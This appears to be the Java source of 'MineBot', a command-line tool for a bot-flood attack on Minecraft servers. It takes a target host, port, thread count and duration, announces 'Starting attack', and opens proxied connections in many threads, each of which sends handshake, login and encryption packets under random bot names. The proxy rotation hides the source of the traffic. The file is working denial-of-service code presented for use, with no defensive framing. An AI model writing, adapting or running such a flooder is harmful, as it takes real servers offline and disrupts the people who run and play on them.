package io.github.cesarsdevs.minebot;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;

public class MineBot {

    private static final ProxyManager proxyManager = new ProxyManager();

    public static int threads = 0;
    public static int number = 0;

    public static void pingBytes(int n) {
        number = n;
    }

    public static void main(final String[] args) {
        if (args.length == 4) {
            try {
                MineBot.pingThreadCrasher(args[0], Integer.parseInt(args[1]), Integer.parseInt(args[2]),
                        Integer.parseInt(args[3]));
            } catch (NumberFormatException | InterruptedException e) {
                // ignore
            }
        } else {
            System.out.println("java -jar minebot-0.0.1-SNAPSHOT.jar <host> <port> <threads> <time>");
        }
    }

    public static void pingThreadCrasher(String host, int port, int maxThreads, long time) throws InterruptedException {
        System.out.println();
        System.out.println("-------------------------");
        System.out.println("Starting attack");
        System.out.println();
        System.out.println("Host: " + host);
        System.out.println("Port: " + port);
        System.out.println("Threads: " + maxThreads);
        System.out.println("Time: " + time);
        System.out.println("-------------------------");
        System.out.println();

        Thread.sleep(3000);

        time = TimeUnit.SECONDS.toMillis(time);
        final long millis = System.currentTimeMillis();

        do {
            if (threads < maxThreads) {
                new Thread(() -> {
                    ++threads;
                    try {
                        pingBytes(number + 1);

                        joinBot(host, port);

                        System.out.println("New #" + number);
                    } catch (Exception exception) {
                        // ignore
                    }
                    --threads;
                }).start();
            }
        } while ((System.currentTimeMillis() - millis) < time);

        System.out.println();
        System.out.println("Starting attack stopped");
        System.out.println();

        System.exit(0);
    }

    public static void joinBot(String host, int port) throws SecurityException, IllegalArgumentException,
            IOException, NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException,
            IllegalBlockSizeException, BadPaddingException, InterruptedException {

        final Proxy proxy = proxyManager.nextProxy();
        final Socket socket = new Socket(proxy);

        System.out.println("Connect Proxy: " + proxy.address());
        socket.connect(new InetSocketAddress(host, port));

        Thread.sleep(1000L);

        final DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        final DataInputStream in = new DataInputStream(socket.getInputStream());
        PacketUtils.sendPacket(PacketUtils.createHandshakeMessage18(host, port, 2), out);
        PacketUtils.sendPacket(PacketUtils.createLogin("BOT-" + ThreadLocalRandom.current().nextInt(99999)), out);

        final int t = PacketUtils.readVarInt(in);
        final byte[] packetdata = new byte[t];
        in.readFully(packetdata, 0, t);

        final DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(packetdata));
        final int id = PacketUtils.readVarInt(dataInputStream);

        if (id == 0) {
            socket.close();
        }

        if (id != 1) {
            final PublicKey publicKey = KeyFactory.getInstance("RSA")
                    .generatePublic(new X509EncodedKeySpec(PacketUtils.readByteArray(dataInputStream)));
            final byte[] verifyToken = PacketUtils.readByteArray(in);

            final KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
            keyGenerator.init(128);

            final SecretKey secretKey = keyGenerator.generateKey();
            final Cipher cipher = Cipher.getInstance("RSA");
            cipher.init(1, publicKey);

            PacketUtils.sendPacket(
                    PacketUtils.createEncryptionResponsePacket(cipher.doFinal(secretKey.getEncoded()), cipher.doFinal(verifyToken)),
                    out);

            System.out.println("Bytes: " + out.size());
            socket.close();
        }
    }
}
